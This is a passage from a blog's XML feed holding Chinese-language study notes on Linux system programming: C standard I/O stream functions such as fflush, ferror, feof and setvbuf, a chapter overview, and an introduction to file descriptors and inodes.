rel="noopener">http://www.runoob.com/cprogramming/c-function-fgetpos.html</a><p></p><h3 id="&#x6E05;&#x6D17;&#x4E00;&#x4E2A;&#x6D41;"><a href="#&#x6E05;&#x6D17;&#x4E00;&#x4E2A;&#x6D41;" class="headerlink" title="&#x6E05;&#x6D17;&#x4E00;&#x4E2A;&#x6D41;"></a>&#x6E05;&#x6D17;&#x4E00;&#x4E2A;&#x6D41;</h3><p>&#x5373;&#x5C06;&#x7528;&#x6237;&#x7F13;&#x51B2;&#x533A;&#x7684;&#x6570;&#x636E;&#x5199;&#x5165;&#x5230;&#x5185;&#x6838;&#x4E4B;&#x4E2D;&#x3002;<br></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">fflush</span> <span class="hljs-params">(FILE *stream)</span></span>;</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="&#x9519;&#x8BEF;&#x4E0E;&#x6587;&#x4EF6;&#x7ED3;&#x675F;"><a href="#&#x9519;&#x8BEF;&#x4E0E;&#x6587;&#x4EF6;&#x7ED3;&#x675F;" class="headerlink" title="&#x9519;&#x8BEF;&#x4E0E;&#x6587;&#x4EF6;&#x7ED3;&#x675F;"></a>&#x9519;&#x8BEF;&#x4E0E;&#x6587;&#x4EF6;&#x7ED3;&#x675F;</h3><p>&#x4E00;&#x4E9B;&#x63A5;&#x53E3;&#x5728;&#x9047;&#x5230;&#x6587;&#x4EF6;&#x7ED3;&#x675F;EOF&#x548C;&#x53D1;&#x751F;&#x9519;&#x8BEF;&#x65F6;&#x8FD4;&#x56DE;&#x7684;&#x4E00;&#x6837;&#xFF0C;&#x5982;fread&#x7B49;&#x3002;<br>&#x7528;&#x4E8E;&#x6D4B;&#x8BD5;&#x662F;&#x5426;&#x5728;&#x6D41;&#x4E2D;&#x8BBE;&#x7F6E;&#x4E86;&#x9519;&#x8BEF;&#x6807;&#x5FD7;&#x7684;ferror&#xFF1A;<br></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">ferror</span> <span class="hljs-params">(FILE *stream)</span></span>;</span><br></pre></td></tr></tbody></table></figure><br>&#x6D4B;&#x8BD5;&#x6587;&#x4EF6;&#x7ED3;&#x675F;&#x6807;&#x5FD7;&#x662F;&#x5426;&#x8BBE;&#x7F6E;&#x7684;feof&#xFF1A;<br><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">feof</span> <span class="hljs-params">(FILE *stream)</span></span>;</span><br></pre></td></tr></tbody></table></figure><br>&#x4E3A;&#x6D41;&#x6E05;&#x7A7A;&#x9519;&#x8BEF;&#x548C;&#x6587;&#x4EF6;&#x7ED3;&#x5C3E;&#x6807;&#x5FD7;&#x7684;clearerr&#xFF1B;<br><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">clearerr</span> <span class="hljs-params">(FILE *stream)</span></span>;</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="&#x83B7;&#x5F97;&#x5173;&#x8054;&#x7684;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;"><a href="#&#x83B7;&#x5F97;&#x5173;&#x8054;&#x7684;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;" class="headerlink" title="&#x83B7;&#x5F97;&#x5173;&#x8054;&#x7684;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;"></a>&#x83B7;&#x5F97;&#x5173;&#x8054;&#x7684;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;</h3><p>&#x7531;&#x6D41;&#x83B7;&#x53D6;&#x5230;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#xFF0C;&#x548C;fdopen&#x6B63;&#x597D;&#x662F;&#x76F8;&#x53CD;&#x7684;&#x529F;&#x80FD;&#xFF1A;<br></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">fileno</span> <span class="hljs-params">(FILE *stream)</span></span>;</span><br></pre></td></tr></tbody></table></figure><br>&#x8FD4;&#x56DE;&#x548C;&#x6D41;&#x5173;&#x8054;&#x7684;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#xFF0C;&#x5931;&#x8D25;&#x65F6;&#x8FD4;&#x56DE;-1.<p></p><h3 id="&#x63A7;&#x5236;&#x7F13;&#x51B2;"><a href="#&#x63A7;&#x5236;&#x7F13;&#x51B2;" class="headerlink" title="&#x63A7;&#x5236;&#x7F13;&#x51B2;"></a>&#x63A7;&#x5236;&#x7F13;&#x51B2;</h3><p>&#x5373;&#x5BF9;&#x7528;&#x6237;&#x7F13;&#x51B2;&#x533A;&#x7684;&#x63A7;&#x5236;&#xFF0C;&#x53EF;&#x4EE5;&#x8BBE;&#x7F6E;&#x4E3A;&#x4E0D;&#x7F13;&#x51B2;&#x3001;&#x884C;&#x7F13;&#x51B2;&#x3001;&#x5757;&#x7F13;&#x51B2;<br>&#x884C;&#x7F13;&#x51B2;&#xFF1A;&#x5728;&#x6BCF;&#x6B21;&#x9047;&#x5230;&#x6362;&#x884C;&#x7B26;&#xFF0C;&#x7F13;&#x51B2;&#x533A;&#x5C06;&#x88AB;&#x63D0;&#x4EA4;&#x7ED9;&#x5185;&#x6838;&#x7F13;&#x51B2;&#x533A;&#x3002;&#xFF08;&#x6807;&#x51C6;&#x8F93;&#x51FA;stdout&#xFF0C;&#x5373;&#x5C4F;&#x5E55;&#x8F93;&#x51FA;&#xFF0C;&#x9ED8;&#x8BA4;&#x662F;&#x884C;&#x7F13;&#x51B2;&#xFF09;<br>&#x5757;&#x7F13;&#x51B2;&#xFF1A;&#x9ED8;&#x8BA4;&#x6240;&#x6709;&#x548C;&#x6587;&#x4EF6;&#x76F8;&#x5173;&#x7684;&#x6D41;&#x90FD;&#x662F;&#x5757;&#x7F13;&#x51B2;&#x3002;&#x5757;&#x7F13;&#x51B2;&#x53C8;&#x79F0;&#x4E3A;&#x5168;&#x7F13;&#x51B2;&#x3002;<br></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">setvbuf</span> <span class="hljs-params">(FILE *stream, <span class="hljs-keyword">char</span> *buf, <span class="hljs-keyword">int</span> mode, <span class="hljs-keyword">size_t</span> <span class="hljs-built_in">size</span>)</span></span>;</span><br></pre></td></tr></tbody></table></figure><br>&#x6A21;&#x5F0F;&#x7528;&#x4E8E;&#x8BBE;&#x7F6E;&#x4E09;&#x79CD;&#x7F13;&#x51B2;&#x5F62;&#x5F0F;&#xFF1A;<br>_IONBF&#xFF1A;&#x65E0;&#x7F13;&#x51B2;<br>_IOLBF&#xFF1A;&#x884C;&#x7F13;&#x51B2;<br>_IOFBF&#xFF1A;&#x5757;&#x7F13;&#x51B2;<br>buf&#x6307;&#x5411;&#x4E00;&#x4E2A;size&#x5927;&#x5C0F;&#x7684;&#x7F13;&#x51B2;&#x533A;&#x7A7A;&#x95F4;&#x3002;&#x65E0;&#x7F13;&#x51B2;&#x6A21;&#x5F0F;&#x4E0D;&#x8003;&#x8651;&#x3002;&#x5982;&#x679C;buf&#x4E3A;&#x7A7A;&#xFF0C;&#x7F13;&#x51B2;&#x533A;&#x5219;&#x6709;glibc&#x81EA;&#x52A8;&#x5206;&#x914D;&#x3002;<br>&#x6210;&#x529F;&#x65F6;&#x8FD4;&#x56DE;0&#xFF0C;&#x4E0D;&#x6210;&#x529F;&#x8FD4;&#x56DE;&#x975E;0.<br>&#x6CE8;&#x610F;&#xFF1A;&#x5728;&#x6D41;&#x5173;&#x95ED;&#x524D;&#xFF0C;&#x7F13;&#x51B2;&#x533A;&#x5FC5;&#x987B;&#x5B58;&#x5728;&#xFF0C;&#x6709;&#x65F6;&#x5019;&#x8BBE;&#x7F6E;buf&#x4E3A;&#x5C40;&#x90E8;&#x53D8;&#x91CF;&#x5728;&#x4F5C;&#x7528;&#x57DF;&#x7ED3;&#x675F;&#x540E;&#x5BFC;&#x81F4;&#x7F13;&#x51B2;&#x533A;&#x9500;&#x6BC1;&#xFF1B;&#x9700;&#x6CE8;&#x610F;&#x5728;&#x4E4B;&#x524D;&#x5173;&#x95ED;&#x6D41;&#x3002;<p></p><h3 id="&#x5176;&#x4ED6;"><a href="#&#x5176;&#x4ED6;" class="headerlink" title="&#x5176;&#x4ED6;"></a>&#x5176;&#x4ED6;</h3><p>&#x6807;&#x51C6;C&#x591A;&#x7EBF;&#x7A0B;&#x8BBF;&#x95EE;&#xFF0C;&#x672C;&#x8D28;&#x4E0A;&#x662F;&#x7EBF;&#x7A0B;&#x5B89;&#x5168;&#x7684;&#xFF0C;&#x5373;&#x591A;&#x7EBF;&#x7A0B;&#x8BBF;&#x95EE;&#xFF0C;&#x9ED8;&#x8BA4;&#x4F1A;&#x52A0;&#x9501;&#x5904;&#x7406;&#x3002;&#x4E5F;&#x53EF;&#x4EE5;&#x4EBA;&#x4E3A;&#x52A0;&#x9501;&#x3002;</p></body></html>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> basic </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 系统编程概述</title>
      <link href="/2017/09/27/Linux-System-Programming-Menu/"/>
      <url>/2017/09/27/Linux-System-Programming-Menu/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>&#x6982;&#x8FF0;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x7B80;&#x5355;&#x63CF;&#x8FF0;&#x6BCF;&#x4E00;&#x7AE0;&#x6240;&#x5305;&#x542B;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x53EF;&#x4EE5;&#x80FD;&#x591F;&#x5FEB;&#x901F;&#x4E86;&#x89E3;&#x5230;Linux&#x7CFB;&#x7EDF;&#x7F16;&#x7A0B;&#x4E2D;&#x6240;&#x5305;&#x542B;&#x7684;&#x5185;&#x5BB9;&#x3002;</p><h2 id="&#x7B80;&#x4ECB;&#x548C;&#x4E3B;&#x8981;&#x6982;&#x5FF5;"><a href="#&#x7B80;&#x4ECB;&#x548C;&#x4E3B;&#x8981;&#x6982;&#x5FF5;" class="headerlink" title="&#x7B80;&#x4ECB;&#x548C;&#x4E3B;&#x8981;&#x6982;&#x5FF5;"></a>&#x7B80;&#x4ECB;&#x548C;&#x4E3B;&#x8981;&#x6982;&#x5FF5;</h2><p>&#x5BF9;&#x5E94;&#x4E66;&#x4E2D;&#x7684;&#x7B2C;&#x4E00;&#x7AE0;&#xFF0C;&#x4ECB;&#x7ECD;&#x7684;&#x662F;&#x6574;&#x4F53;&#x5185;&#x5BB9;&#x4EE5;&#x53CA;&#x4E00;&#x4E9B;&#x6982;&#x5FF5;&#xFF1B;&#x6574;&#x4F53;&#x5185;&#x5BB9;&#x5305;&#x62EC;&#x6587;&#x4EF6;&#x7684;&#x64CD;&#x4F5C;(I/O); &#x8FDB;&#x7A0B;; &#x5185;&#x5B58;; &#x4FE1;&#x53F7;; &#x65F6;&#x95F4;&#x3002;</p><h3 id="&#x6587;&#x4EF6;I-O&#x7684;&#x6982;&#x5FF5;"><a href="#&#x6587;&#x4EF6;I-O&#x7684;&#x6982;&#x5FF5;" class="headerlink" title="&#x6587;&#x4EF6;I/O&#x7684;&#x6982;&#x5FF5;"></a>&#x6587;&#x4EF6;I/O&#x7684;&#x6982;&#x5FF5;</h3><p>&#x5982;&#x4F55;&#x5728;&#x7A0B;&#x5E8F;&#x4E2D;&#x8BBF;&#x95EE;&#x5230;&#x6587;&#x4EF6;&#xFF1F;&#x901A;&#x8FC7;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#xFF1B;&#x800C;&#x901A;&#x8FC7;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#x7D22;&#x5F15;&#x5230;&#x7684;&#x662F;&#x4E00;&#x4E2A;inode&#x6807;&#x8BC6;&#xFF0C;&#x7136;&#x540E;&#x901A;&#x8FC7;inode&#x76F4;&#x63A5;&#x5173;&#x8054;&#x5230;&#x5B9E;&#x9645;&#x7684;&#x6587;&#x4EF6;&#x3002;&#x4F46;&#x662F;&#x901A;&#x8FC7;inode&#x6765;&#x8BBF;&#x95EE;&#x5BF9;&#x7528;&#x6237;&#x6765;&#x8BF4;&#x5E76;&#x4E0D;&#x662F;&#x5F88;&#x65B9;&#x4FBF;&#xFF0C;&#x6BD5;&#x7ADF;inode&#x53EA;&#x662F;&#x4E00;&#x4E2A;&#x6574;&#x6570;&#x503C;&#xFF0C;&#x5E76;&#x4E0D;&#x80FD;&#x76F4;&#x89C2;&#x7684;&#x5BF9;&#x5E94;&#x5230;&#x6587;&#x4EF6;&#xFF1B;&#x6240;&#x4EE5;&#x6B64;&#x65F6;&#x5C31;&#x5EFA;&#x7ACB;&#x4E86;&#x4E00;&#x5F20;&#x8868;&#xFF0C;&#x5C06;&#x6587;&#x4EF6;&#x540D;&#x548C;inode&#x8FDB;&#x884C;&#x6620;&#x5C04;&#xFF0C;&#x90A3;&#x4E48;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x6587;&#x4EF6;&#x540D;&#x6765;&#x8BBF;&#x95EE;&#x5230;inode&#x4ECE;&#x800C;&#x8BBF;&#x95EE;&#x5230;&#x6587;&#x4EF6;&#x4E86;&#xFF0C;&#x8FD9;&#x5C31;&#x662F;&#x76EE;&#x5F55;&#x548C;&#x6620;&#x5C04;&#x7684;&#x6982;&#x5FF5;&#x3002;</p><h3 id="&#x5176;&#x4ED6;"><a href="#&#x5176;&#x4ED6;" class="headerlink" title="&#x5176;&#x4ED6;"></a>&#x5176;&#x4ED6;</h3><p>&#x5176;&#x4ED6;&#x50CF;&#x8FDB;&#x7A0B;&#x7EBF;&#x7A0B;&#xFF0C;&#x7528;&#x6237;&#x6743;&#x9650;&#x7B49;&#x53EA;&#x6311;&#x4E86;&#x51E0;&#x4E2A;&#x5173;&#x952E;&#x7684;&#x6982;&#x5FF5;&#x4ECB;&#x7ECD;&#x4E86;&#x4E0B;&#x3002;<br>&#x8BE6;&#x89C1;&#xFF1A; <a href="/2017/09/18/Linux-System-Programming/index.html">&#x7B80;&#x4ECB;</a></p><h2 id="&#x6587;&#x4EF6;I-O"><a href="#&#x6587;&#x4EF6;I-O" class="headerlink" title="&#x6587;&#x4EF6;I/O"></a>&#x6587;&#x4EF6;I/O</h2><p>&#x6587;&#x4EF6;I/O &#x8FD9;&#x7AE0;&#x4ECB;&#x7ECD;I/O&#x7684;&#x4E00;&#x4E9B;&#x57FA;&#x672C;&#x6982;&#x5FF5;&#xFF0C;&#x5305;&#x62EC;&#x4ECE;&#x6253;&#x5F00;&#x6587;&#x4EF6;&#x3001;&#x8BFB;&#x5199;&#x6587;&#x4EF6;&#x3001;&#x5173;&#x95ED;&#x6587;&#x4EF6;&#xFF1B;&#x56E0;&#x4E3A;&#x4E3A;&#x4E86;&#x51CF;&#x5C11;&#x5199;&#x5165;&#x78C1;&#x76D8;&#x7684;&#x6B21;&#x6570;&#xFF0C;&#x5F15;&#x5165;&#x7684;&#x5EF6;&#x8FDF;&#x5199;&#x5165;&#x7684;&#x673A;&#x5236;&#xFF0C;&#x5F53;&#x7136;&#x4E5F;&#x5C06;&#x63D0;&#x4F9B;&#x63A5;&#x53E3;&#x4F7F;&#x5F97;&#x6570;&#x636E;&#x4E00;&#x6B21;&#x5199;&#x5165;&#xFF0C;&#x90A3;&#x5C31;&#x662F;&#x540C;&#x6B65;I/O&#xFF1B;&#x4E0D;&#x4F9D;&#x8D56;&#x4E8E;Linux&#x7CFB;&#x7EDF;&#x63D0;&#x4F9B;&#x7684;I/O&#x673A;&#x5236;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x76F4;&#x63A5;I/O&#x4E86;&#x3002;&#x9ED8;&#x8BA4;&#x662F;&#x5728;&#x6587;&#x4EF6;&#x8D77;&#x59CB;&#x4F4D;&#x7F6E;&#x8FDB;&#x884C;&#x8BFB;&#x5199;&#xFF0C;&#x82E5;&#x9700;&#x8981;&#x6307;&#x5B9A;&#x4F4D;&#x7F6E;&#x8BFB;&#x5199;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;lseek&#x7B49;&#x63A5;&#x53E3;&#x4E86;&#xFF1B;&#x8FD8;&#x6709;&#x622A;&#x65AD;&#x6587;&#x4EF6;&#x5230;&#x6307;&#x5B9A;&#x957F;&#x5EA6;&#x7684;truncate&#x3001;ftruncate&#x4EE5;&#x53CA;I/O&#x591A;&#x8DEF;&#x590D;&#x7528;&#x63A5;&#x53E3;select&#x3001;poll&#x3001;epoll&#xFF1B;&#x6700;&#x540E;&#x4ECB;&#x7ECD;&#x4E86;&#x5185;&#x6838;&#x5BF9;&#x6587;&#x4EF6;I/O&#x7684;&#x4E09;&#x4E2A;&#x673A;&#x5236;&#xFF0C;&#x5305;&#x62EC;&#x865A;&#x62DF;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x3001;&#x9875;&#x7F13;&#x5B58;&#x3001;&#x9875;&#x56DE;&#x5199;&#xFF0C;&#x4E3B;&#x8981;&#x662F;&#x4E3A;&#x4E86;&#x63D0;&#x9AD8;&#x597D;&#x7684;&#x5C01;&#x88C5;&#x578B;&#x4EE5;&#x53CA;&#x9AD8;&#x6548;&#x6027;&#x800C;&#x8BBE;&#x8BA1;&#x3002;<br>&#x8BE6;&#x89C1;&#xFF1A; <a href="/2017/09/21/Linux-System-Programming-1/index.html">&#x6587;&#x4EF6;I/O</a></p><h2 id="&#x7F13;&#x51B2;&#x8F93;&#x5165;&#x8F93;&#x51FA;"><a href="#&#x7F13;&#x51B2;&#x8F93;&#x5165;&#x8F93;&#x51FA;" class="headerlink" title="&#x7F13;&#x51B2;&#x8F93;&#x5165;&#x8F93;&#x51FA;"></a>&#x7F13;&#x51B2;&#x8F93;&#x5165;&#x8F93;&#x51FA;</h2><p>&#x8FD9;&#x4E00;&#x7AE0;&#x4ECB;&#x7ECD;&#x7684;&#x5C31;&#x662F;C&#x63D0;&#x4F9B;&#x7ED9;I/O&#x63A5;&#x53E3;&#xFF0C;&#x5BF9;&#x4E8E;Linux&#x7CFB;&#x7EDF;I/O&#x63A5;&#x53E3;&#x7684;&#x4E00;&#x4E2A;&#x5C01;&#x88C5;&#xFF0C;&#x80FD;&#x591F;&#x66F4;&#x7B80;&#x5355;&#x7684;&#x6EE1;&#x8DB3;&#x5404;&#x79CD;&#x8BFB;&#x5199;&#x8981;&#x6C42;&#xFF08;&#x5982;&#x8BFB;&#x53D6;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x5199;&#x5165;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#x4E32;&#x7B49;&#xFF09;&#xFF1B;&#x524D;&#x9762;&#x63D0;&#x5230;Linux&#x7CFB;&#x7EDF;I/O&#x63A5;&#x53E3;&#x5C06;&#x6587;&#x4EF6;&#x4F5C;&#x4E3A;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#x6765;&#x8FDB;&#x884C;&#x5904;&#x7406;&#xFF0C;&#x800C;&#x8FD9;&#x91CC;&#x7684;C&#x63A5;&#x53E3;&#x5C06;&#x6587;&#x4EF6;&#x4F5C;&#x4E3A;&#x6D41;&#x8FDB;&#x884C;&#x5904;&#x7406;&#xFF0C;&#x5E76;&#x4E14;&#x548C;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#x662F;&#x5BF9;&#x5E94;&#x7684;&#x3002;<br>&#x5173;&#x4E8E;&#x8FD9;&#x7AE0;&#x4E3A;&#x5565;&#x53EB;&#x7F13;&#x51B2;&#x8F93;&#x5165;&#x8F93;&#x51FA;&#xFF0C;&#x6211;&#x7684;&#x7406;&#x89E3;&#x662F;C&#x7684;&#x63A5;&#x53E3;&#x4F1A;&#x7EF4;&#x62A4;&#x4E00;&#x4E2A;&#x5355;&#x72EC;I/O&#x7F13;&#x51B2;&#x533A;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x4E0E;&#x7CFB;&#x7EDF;&#x7F13;&#x51B2;&#x533A;&#x8FDB;&#x884C;&#x4EA4;&#x4E92;&#x3002;<br>&#x8BE6;&#x89C1;&#xFF1A; <a href="/2017/09/27/Linux-System-Programming-2/index.html">&#x7F13;&#x51B2;&#x8F93;&#x5165;&#x8F93;&#x51FA;</a></p><h2 id="&#x9AD8;&#x7EA7;&#x6587;&#x4EF6;I-O"><a href="#&#x9AD8;&#x7EA7;&#x6587;&#x4EF6;I-O" class="headerlink" title="&#x9AD8;&#x7EA7;&#x6587;&#x4EF6;I/O"></a>&#x9AD8;&#x7EA7;&#x6587;&#x4EF6;I/O</h2><p>&#x8FD9;&#x4E00;&#x7AE0;&#x63D0;&#x4F9B;&#x4E00;&#x4E9B;&#x66F4;&#x52A0;&#x9AD8;&#x7EA7;&#x7684;I/0&#x7CFB;&#x7EDF;&#x8C03;&#x7528;&#xFF0C;&#x5305;&#x62EC;&#xFF1A;</p><ol><li>&#x5728;&#x4E00;&#x6B21;&#x8C03;&#x7528;&#x65F6;&#xFF0C;&#x540C;&#x65F6;&#x5BF9;&#x591A;&#x4E2A;&#x7F13;&#x51B2;&#x533A;&#x505A;&#x8BFB;&#x53D6;&#x6216;&#x8005;&#x5199;&#x5165;&#x64CD;&#x4F5C;&#x7684; &#x6563;&#x5E03;/&#x805A;&#x96C6; I/O</li><li>&#x5728;&#x4E00;&#x4E2A;&#x8FDB;&#x7A0B;&#x4E2D;&#x5904;&#x7406;&#x5927;&#x91CF;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#x7684; epoll</li><li>&#x5C06;&#x6587;&#x4EF6;&#x6620;&#x5C04;&#x5230;&#x5185;&#x5B58;&#x7684; &#x5185;&#x5B58;&#x6620;&#x5C04;I/O</li><li>&#x5141;&#x8BB8;&#x8FDB;&#x7A0B;&#x5C06;&#x6587;&#x4EF6;I/O&#x4F7F;&#x7528;&#x65F6;&#x7684;&#x4E00;&#x4E9B;&#x63D0;&#x793A;&#x4FE1;&#x606F;&#x7ED9;&#x5185;&#x6838;&#x7684; &#x6587;&#x4EF6;I/O&#x63D0;&#x793A;</li><li>&#x5141;&#x8BB8;&#x8FDB;&#x7A0B;&#x53D1;&#x51FA;&#x591A;&#x4E2A;I/O&#x8BF7;&#x6C42;&#x4F46;&#x4E0D;&#x9700;&#x8981;&#x7B49;&#x5F85;&#x7684; &#x5F02;&#x6B65;I/O<br>&#x8BE6;&#x89C1;&#xFF1A;<a href="/2017/10/09/Linux-System-Programming-3/index.html">&#x9AD8;&#x7EA7;&#x6587;&#x4EF6;I/O</a></li></ol></body></html>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> basic </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 系统编程导读 - 文件I/O</title>
      <link href="/2017/09/21/Linux-System-Programming-1/"/>
      <url>/2017/09/21/Linux-System-Programming-1/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>&#x6309;&#x7167;&#x4E66;&#x7C4D;&#x7684;&#x7B80;&#x4ECB;&#xFF0C;&#x5BF9;&#x6587;&#x4EF6;I/O&#x7684;&#x4ECB;&#x7ECD;&#x6D41;&#x7A0B;&#x4E3A;&#xFF1A;&#x6587;&#x4EF6;I/O&#x7684;&#x76F8;&#x5173;&#x6982;&#x5FF5;&#x3001;C&#x6807;&#x51C6;&#x7684;I/O&#x63A5;&#x53E3;&#x3001;&#x66F4;&#x9AD8;&#x7EA7;&#x4E13;&#x95E8;&#x5316;&#x7684;I/O&#x63A5;&#x53E3;&#x3001;&#x6587;&#x4EF6;&#x548C;&#x76EE;&#x5F55;&#x64CD;&#x4F5C;&#x56DB;&#x4E2A;&#x90E8;&#x5206;&#x3002;</p><h3 id="&#x6587;&#x4EF6;I-O&#x57FA;&#x7840;"><a href="#&#x6587;&#x4EF6;I-O&#x57FA;&#x7840;" class="headerlink" title="&#x6587;&#x4EF6;I/O&#x57FA;&#x7840;"></a>&#x6587;&#x4EF6;I/O&#x57FA;&#x7840;</h3><p>&#x8FD9;&#x7AE0;&#x4E3B;&#x8981;&#x4ECB;&#x7ECD;Linux&#x662F;&#x5982;&#x4F55;&#x7BA1;&#x7406;&#x6587;&#x4EF6;&#x7684;&#x8BFB;&#x5199;&#x64CD;&#x4F5C;&#x7684;&#xFF0C;&#x4ECE;&#x6253;&#x5F00;&#x6587;&#x4EF6;&#x5230;&#x6587;&#x4EF6;&#x5173;&#x95ED;&#x4E2D;&#x9014;&#x7684;&#x4E00;&#x7CFB;&#x5217;&#x5BF9;&#x6587;&#x4EF6;&#x7684;&#x64CD;&#x4F5C;&#x8FC7;&#x7A0B;&#x3002;&#x8FD9;&#x91CC;&#x6CE8;&#x610F;&#x7684;&#x662F;4&#x70B9;&#xFF1A;</p><ol><li>&#x6587;&#x4EF6;&#x901A;&#x8FC7;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#x6765;&#x64CD;&#x4F5C;&#xFF0C;&#x5373;&#x6253;&#x5F00;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#xFF0C;&#x5C31;&#x4F1A;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#xFF1B;&#x7136;&#x540E;Linux Kernel&#x4E3A;&#x6BCF;&#x4E00;&#x4E2A;&#x8FDB;&#x7A0B;&#x7EF4;&#x62A4;&#x4E00;&#x5F20;&#x6253;&#x5F00;&#x6587;&#x4EF6;&#x8868;&#xFF0C;&#x6309;&#x7167;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#x5BF9;&#x6253;&#x5F00;&#x7684;&#x6587;&#x4EF6;&#x8FDB;&#x884C;&#x7D22;&#x5F15;&#x3002;&#x5F53;&#x7136;&#x6700;&#x7EC8;&#x8FD8;&#x662F;&#x7D22;&#x5F15;&#x5230;inode&#x3002;</li><li>&#x6BCF;&#x4E2A;&#x8FDB;&#x7A0B;&#x4E00;&#x5F00;&#x59CB;&#x542F;&#x52A8;&#x9ED8;&#x8BA4;&#x6253;&#x5F00;&#x7684;&#x4E09;&#x4E2A;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#xFF0C;0&#x8868;&#x793A;&#x6807;&#x51C6;&#x8F93;&#x5165;&#xFF0C;1&#x8868;&#x793A;&#x6807;&#x51C6;&#x8F93;&#x51FA;&#xFF0C;2&#x8868;&#x793A;&#x6807;&#x51C6;&#x9519;&#x8BEF;&#xFF1B;&#x56E0;&#x6B64;&#x6211;&#x4EEC;&#x6253;&#x5F00;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#xFF0C;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#x4E00;&#x822C;&#x90FD;&#x662F;&#x4ECE;3&#x5F00;&#x59CB;&#x3002;</li><li>&#x6587;&#x4EF6;&#x7684;&#x6982;&#x5FF5;&#xFF0C;&#x65E2;&#x5305;&#x62EC;&#x666E;&#x901A;&#x6587;&#x4EF6;&#xFF0C;&#x4E5F;&#x7528;&#x4E8E;&#x8BBF;&#x95EE;&#x8BBE;&#x5907;&#x6587;&#x4EF6;&#x3001;&#x7BA1;&#x9053;&#x3001;&#x76EE;&#x5F55;&#x7B49;&#x7B49;&#x3002;&#x9075;&#x5FAA;&#x4E00;&#x5207;&#x7686;&#x6587;&#x4EF6;&#x7684;&#x7406;&#x5FF5;&#xFF0C;&#x4EFB;&#x4F55;&#x80FD;&#x591F;&#x8BFB;&#x5199;&#x7684;&#x4E1C;&#x897F;&#x90FD;&#x53EF;&#x4EE5;&#x7528;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#x6765;&#x8BBF;&#x95EE;&#x3002;</li><li>&#x5173;&#x4E8E;&#x5B